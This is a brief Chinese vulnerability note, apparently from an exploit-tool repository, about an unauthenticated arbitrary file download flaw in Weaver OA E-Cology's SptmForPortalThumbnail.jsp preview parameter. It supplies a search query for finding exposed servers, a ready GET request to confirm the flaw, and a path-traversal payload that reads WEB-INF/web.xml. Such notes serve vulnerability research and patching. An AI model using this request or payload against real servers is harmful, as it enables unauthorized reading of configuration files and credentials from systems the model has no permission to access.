---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微OA SptmForPortalThumbnail.jsp 任意文件下载漏洞

## 漏洞描述

泛微OA E-Cology 的 `/portal/SptmForPortalThumbnail.jsp` 接口中 `preview` 参数存在任意文件下载漏洞，未对文件路径做有效限制。攻击者无需登录，通过指定 `preview` 参数即可下载服务器上的任意文件。

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp HTTP/1.1
```

若响应返回目标文件内容，则漏洞存在。可通过路径遍历（如 `preview=../../WEB-INF/web.xml`）下载服务器上的敏感配置文件。
